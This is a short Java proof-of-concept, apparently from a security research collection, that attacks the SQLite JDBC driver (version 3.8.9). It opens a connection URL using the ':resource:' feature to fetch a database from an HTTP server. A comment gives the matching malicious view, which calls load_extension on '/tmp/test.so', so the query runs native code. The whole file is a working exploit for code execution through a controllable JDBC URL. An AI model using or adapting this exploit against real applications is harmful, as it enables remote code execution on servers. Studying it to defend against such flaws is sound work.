package org.su18.jdbc.attack;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.Statement;

/**
 * 依赖版本 3.8.9
 * 驱动名称 org.sqlite.JDBC
 * 属性名 :resource:
 * 连接参数 jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db
 * 数据库 CREATE VIEW security as SELECT ( SELECT load_extension('/tmp/test.so'));
 *
 * @author su18
 */
public class AttackSQLite {

	public static void main(String args[]) throws Exception {

		Class.forName("org.sqlite.JDBC");
		Connection connection = DriverManager.getConnection("jdbc:sqlite::resource:http://127.0.0.1:8888/poc.db");

		connection.setAutoCommit(true);
		Statement statement = connection.createStatement();
		statement.execute("SELECT * FROM security");

		statement.close();
		connection.close();

	}
}
